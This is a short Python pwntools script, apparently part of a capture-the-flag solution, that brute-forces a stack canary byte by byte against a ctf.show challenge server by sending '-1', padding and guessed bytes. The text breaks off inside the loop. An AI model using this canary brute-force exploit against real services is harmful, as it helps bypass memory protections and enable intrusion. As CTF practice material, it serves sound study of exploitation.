from pwn import *
context.log_level = 'critical'
canary = ''
for i in range(4):
    for c in range(0xFF):
        #io = process('./pwn')
        io = remote('pwn.challenge.ctf.show',28173)
        io.sendlineafter('>','-1')
        payload = 'a'*0x20 + canary + p8(c)
        io.sendafter('$ ',payload)
        io.recv(1)
        ans = io.recv()
